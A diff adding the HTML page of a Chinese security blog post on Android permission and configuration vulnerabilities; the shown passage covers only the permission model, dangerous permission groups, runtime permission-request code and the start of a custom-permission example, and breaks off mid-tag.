@@ -1,0 +1,892 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"security-kitchen.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.json"};
+  </script>
+
+  <meta name="description" content="一、前言前几篇帖子我们将Android的四大组件中漏洞做了一个具体的介绍，本节我们将进一步介绍Android中的权限配置相关的漏洞以及Android安全配置漏洞，因为权限配置往往和组件关联性很大，所以大家可以结合前几篇帖子来看。2017年权限漏洞仍占据漏洞榜单的第三名，但随着近几年的快速发展，开发人员开始不断注意对权限的安全设置，权限漏洞已经逐渐减少了。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Android App漏洞之战（13）——权限安全和安全配置漏洞详解">
+<meta property="og:url" content="http://security-kitchen.com/2023/02/13/bug0013/index.html">
+<meta property="og:site_name" content="欢迎来到安全后厨！">
+<meta property="og:description" content="一、前言前几篇帖子我们将Android的四大组件中漏洞做了一个具体的介绍，本节我们将进一步介绍Android中的权限配置相关的漏洞以及Android安全配置漏洞，因为权限配置往往和组件关联性很大，所以大家可以结合前几篇帖子来看。2017年权限漏洞仍占据漏洞榜单的第三名，但随着近几年的快速发展，开发人员开始不断注意对权限的安全设置，权限漏洞已经逐渐减少了。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/1.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/2.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/3.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/4.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/5.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/6.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/7.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/8.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/9.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/10.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/11.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/12.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/13.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/14.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/15.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/16.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/18.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/19.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/20.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/21.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/22.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/23.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/24.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/25.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/26.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/27.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/28.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/29.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/30.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/32.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/31.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/33.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/34.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/35.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/36.png">
+<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/37.png">
+<meta property="article:published_time" content="2023-02-13T01:11:19.000Z">
+<meta property="article:modified_time" content="2023-12-23T09:13:44.112Z">
+<meta property="article:author" content="安全后厨团队">
+<meta property="article:tag" content="漏洞挖掘">
+<meta property="article:tag" content="工具">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/1.png">
+
+<link rel="canonical" href="http://security-kitchen.com/2023/02/13/bug0013/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Android App漏洞之战（13）——权限安全和安全配置漏洞详解 | 欢迎来到安全后厨！</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="欢迎来到安全后厨！" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+	<div class="headband"></div>
+    <a target="_blank" rel="noopener" href="https://github.com/WindXaa?tab=repositories" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">欢迎来到安全后厨！</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-resources">
+
+    <a href="/resources/" rel="section"><i class="fa fa-download fa-fw"></i>资源</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://security-kitchen.com/2023/02/13/bug0013/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="安全后厨团队">
+      <meta itemprop="description" content="选择有时候比努力更重要">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="欢迎来到安全后厨！">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Android App漏洞之战（13）——权限安全和安全配置漏洞详解
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-02-13 09:11:19" itemprop="dateCreated datePublished" datetime="2023-02-13T09:11:19+08:00">2023-02-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-12-23 17:13:44" itemprop="dateModified" datetime="2023-12-23T17:13:44+08:00">2023-12-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Android-APP%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%88%98/" itemprop="url" rel="index"><span itemprop="name">Android APP漏洞之战</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>前几篇帖子我们将Android的四大组件中漏洞做了一个具体的介绍，本节我们将进一步介绍Android中的权限配置相关的漏洞以及Android安全配置漏洞，因为权限配置往往和组件关联性很大，所以大家可以结合前几篇帖子来看。2017年权限漏洞仍占据漏洞榜单的第三名，但随着近几年的快速发展，开发人员开始不断注意对权限的安全设置，权限漏洞已经逐渐减少了。</p>
+<span id="more"></span>
+<p>本文第二节主要讲述Android权限机制，以及Android中权限所涉及的安全问题</p>
+<p>本文第三节主要讲述权限安全漏洞的原理和拿两个案例复现相关的权限漏洞，并给出了相应的防护方案</p>
+<p>本文第四节主要介绍Android中的安全配置问题，梳理了AndroidManifest.xml的结构注册，并讲解了相关的配置安全问题</p>
+<p>本文第五节主要复现和详细介绍了Android安全配置中的漏洞问题</p>
+<h2 id="二、Android权限机制介绍"><a href="#二、Android权限机制介绍" class="headerlink" title="二、Android权限机制介绍"></a>二、Android权限机制介绍</h2><h3 id="1-Android权限"><a href="#1-Android权限" class="headerlink" title="1. Android权限"></a>1. Android权限</h3><h4 id="（1）Android权限原理"><a href="#（1）Android权限原理" class="headerlink" title="（1）Android权限原理"></a>（1）Android权限原理</h4><p>Android设置权限主要是为了保护Android用户的隐私，根据功能不同，系统会授予不同的权限，而对于用户的一些敏感数据，用户必须要申请权限之后才能访问，具体的示意图如下：</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/1.png" alt="image-20211025162212783"></p>
+<h4 id="（2）Android权限的分类"><a href="#（2）Android权限的分类" class="headerlink" title="（2）Android权限的分类"></a>（2）Android权限的分类</h4><p>从官方的文档中，我们可以知道Android将权限分为：<code>安装时权限、运行时权限和特殊权限</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)安装时权限：用户在安装应用程序时，应用程序会向用户申请的基本权限，这类权限一般被分配为：普通权限和签名权限</span><br><span class="line">(<span class="number">2</span>)运行时权限：Android6<span class="number">.0</span>之后，Android中加入了运行时权限，应用程序在运行过程中需要访问一些敏感数据，需要向用户请求权限，这类权限被分配为：危险权限</span><br><span class="line">(<span class="number">3</span>)特殊权限：只有平台和原始设备制造商（OEM）可以定义，为了执行特定的操作而申请的权限，这类权限被分配为：保护权限</span><br></pre></td></tr></table></figure>
+
+<p>我们从上文中可以知道Android 6.0是一个重要节点，所以下面我们以此为界详细的描述权限的变化情况，权限的API参考：<a target="_blank" rel="noopener" href="https://developer.android.com/reference/android/Manifest.permission?hl=zh-cn">权限API列表</a></p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/2.png" alt="image-20211025170220085"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">危险权限的处理：</span><br><span class="line">（1）Android 6.0之前应用程序会在程序安装时申请全部危险权限，一些应用可能用户不授权就无法成功安装，存在很大的安全风险</span><br><span class="line">（2）Android 6.0之后应用程序在使用危险权限时，需要向用户动态申请</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">正常权限：manifest文件声明即可使用，安装apk时授予，app运行时不在提示</span><br><span class="line">危险权限：涉及到用户隐私，用户数据相关的权限，manifest声明，代码中还要动态申请</span><br></pre></td></tr></table></figure>
+
+<h4 id="（3）权限组"><a href="#（3）权限组" class="headerlink" title="（3）权限组"></a>（3）权限组</h4><p>Android系统对所有的<code>危险权限</code>进行了分组，称为权限组</p>
+<table>
+<thead>
+<tr>
+<th align="left"><strong>权限组</strong></th>
+<th>权限</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">CALENDAR</td>
+<td>READ_CALENDAR<br/>WRITE_CALENDAR</td>
+</tr>
+<tr>
+<td align="left">CAMERA</td>
+<td>CAMERA</td>
+</tr>
+<tr>
+<td align="left">CONTACTS</td>
+<td>READ_CONTACTS<br/>WRITE_CONTACTS<br/>GET_ACCOUNTS</td>
+</tr>
+<tr>
+<td align="left">LOCATION</td>
+<td>ACCESS_FINE_LOCATION<br/>ACCESS_COARSE_LOCATION</td>
+</tr>
+<tr>
+<td align="left">MICROPHONE</td>
+<td>RECORD_AUDIO</td>
+</tr>
+<tr>
+<td align="left">PHONE</td>
+<td>READ_PHONE_STATE<br/>CALL_PHONE<br/>READ_CALL_LOG<br/>WRITE_CALL_LOG<br/>ADD_VOICEMAIL<br/>USE_SIP<br/>PROCESS_OUTGOING_CALLS</td>
+</tr>
+<tr>
+<td align="left">SENSORS</td>
+<td>BODY_SENSORS</td>
+</tr>
+<tr>
+<td align="left">SMS</td>
+<td>SEND_SMS<br/>RECEIVE_SMS<br/>READ_SMS<br/>RECEIVE_WAP_PUSH<br/>RECEIVE_MMS</td>
+</tr>
+<tr>
+<td align="left">STORAGE</td>
+<td>READ_EXTERNAL_STORAGE<br/>WRITE_EXTERNAL_STORAGE</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">权限组的区别：</span><br><span class="line">（1）Android 6.0-8.0：用户只要同意权限组的任意一个权限，用户则会获得此权限组的所有权限</span><br><span class="line">（2）Android 9.0及以后: 用户申请某个组内的一个权限，系统不会给同组内的其他权限，用户申请哪个，系统就给哪个</span><br></pre></td></tr></table></figure>
+
+<h4 id="（4）如何请求权限"><a href="#（4）如何请求权限" class="headerlink" title="（4）如何请求权限"></a>（4）如何请求权限</h4><h5 id="lt-1-gt-向清单文件中添加权限"><a href="#lt-1-gt-向清单文件中添加权限" class="headerlink" title="&lt;1&gt;向清单文件中添加权限"></a>&lt;1&gt;向清单文件中添加权限</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">&quot;com.ceco.r.gravitybox&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:versionCode</span>=<span class="string">&quot;1105&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:versionName</span>=<span class="string">&quot;11.0.5&quot;</span> &gt;</span></span><br><span class="line">    //声明权限</span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_SYNC_SETTINGS&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_SYNC_SETTINGS&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>无论应用需要什么权限，都需要在清单文件中对权限声明，系统会根据权限的等级来采取不同的操作，对不同的权限，系统会在安装应用时立即授予这些权限，对于危险权限，则需要用户明确授权才能获得</p>
+<h5 id="lt-2-gt-运行时申请权限"><a href="#lt-2-gt-运行时申请权限" class="headerlink" title="&lt;2&gt;运行时申请权限"></a>&lt;2&gt;运行时申请权限</h5><p>申请权限的常用步骤：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">权限申请步骤：</span><br><span class="line"><span class="number">1.</span>检查有无权限</span><br><span class="line">	有权限——&gt;运行</span><br><span class="line">	无权限——&gt;申请权限</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>申请权限（走权限回调）</span><br><span class="line">	用户同意——&gt;运行</span><br><span class="line">	用户拒绝——&gt;展示跳转设置界面对话框</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>跳转设置对话框</span><br><span class="line">	同意跳转——&gt;跳转特定的权限打开界面</span><br><span class="line">	用户拒绝——&gt;Toast提示没权限，功能不能正常使用</span><br></pre></td></tr></table></figure>
+
+<p><strong>检查有无权限：</strong></p>
+<p>应用程序需要一项危险权限，每次执行需要危险权限的操作时，都必须检查自己是否具有该权限，Android 6.0开始，用户可以1随时从任何应用撤销权限，即便应用以较低的API为目标平台，检查应用是否具备某项权限，调用<code>ContextCompat.checkSelfPermission()</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ContextCompat.checkSelfPermission方法：检查是否具有某项权限 </span><br><span class="line">参数<span class="number">1</span>：Context 参数<span class="number">2</span>：权限名    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (ContextCompat.checkSelfPermission(thisActivity, Manifest.permission.WRITE_CALENDAR)</span><br><span class="line">            != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">        <span class="comment">// 权限没有被授予</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>申请权限：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ActivityCompat.requestPermissions方法：</span><br><span class="line">参数<span class="number">1</span>：activity  参数<span class="number">2</span>：要申请权限的字符串数组  参数<span class="number">3</span>：请求码</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ContextCompat.checkSelfPermission(thisActivity, Manifest.permission.WRITE_CALENDAR)</span><br><span class="line">            != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">        <span class="comment">// 权限没有被授予，申请权限</span></span><br><span class="line">        ActivityCompat.requestPermissions(thisActivity,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;Manifest.permission.READ_CONTACTS&#125;,<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）requestPermissions执行时会弹系统对话框申请相关的权限。用户可以选择同意授权，或者拒绝授权。对话框关闭之后就走Activity的onRequestPermissionsResult回调了</span><br><span class="line">（<span class="number">2</span>）请求危险权限，之前需要在清单文件声明，否则对话框不弹，直接就是用户拒绝这个权限</span><br><span class="line">（<span class="number">3</span>）总之，只要使用权限就必须清单文件先声明，只是危险权限还需要动态申请</span><br></pre></td></tr></table></figure>
+
+<p><strong>对话框关闭后，请求回调:</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">onRequestPermissionsResult方法：</span><br><span class="line">参数<span class="number">1</span>：请求码 参数<span class="number">2</span>：请求的权限 参数<span class="number">3</span>：授权结果数组</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onRequestPermissionsResult</span><span class="params">(<span class="type">int</span> requestCode, <span class="meta">@NonNull</span> String[] permissions,</span></span><br><span class="line"><span class="params">            <span class="meta">@NonNull</span> <span class="type">int</span>[] grantResults)</span>&#123;</span><br><span class="line">            <span class="keyword">switch</span>(requestCode)&#123;</span><br><span class="line">            	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            		<span class="keyword">if</span>(grantResults.length&gt;<span class="number">0</span> &amp;&amp; grantResults[<span class="number">0</span>] == PackageManager.PERMISSION_GRANTED)&#123;</span><br><span class="line">                        call();</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="comment">//你没有授权</span></span><br><span class="line">                        Toast.makeText(<span class="string">&quot;TAG&quot;</span>, <span class="string">&quot;你没有授权！&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">回调函数，你授权后就会执行call(),你没有授权就会提示没有权限</span><br></pre></td></tr></table></figure>
+
+<h4 id="（5）自定义权限"><a href="#（5）自定义权限" class="headerlink" title="（5）自定义权限"></a>（5）自定义权限</h4><p>Android中应用程序可以自定义权限来提供给其他程序访问自己的功能</p>
+<h5 id="lt-1-gt-如何定义自定义权限"><a href="#lt-1-gt-如何定义自定义权限" class="headerlink" title="&lt;1&gt; 如何定义自定义权限"></a>&lt;1&gt; 如何定义自定义权限</h5><p>我们要定义自定义权限，需要在<code>AndroidManifest.xml</code>中使用<code>&lt;permission&gt;</code>来声明</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">package</span>=<span class="string">&quot;com.example.test&quot;</span> &gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">permission</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:name</span>=<span class="string">&quot;com.example.myapp.permission.DEADLY_ACTIVITY&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:label</span>=<span class="string">&quot;@string/permlab_deadlyActivity&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:description</span>=<span class="string">&quot;@string/permdesc_deadlyActivity&quot;</span></span></span><br><span class="line"><span class="tag">      <span 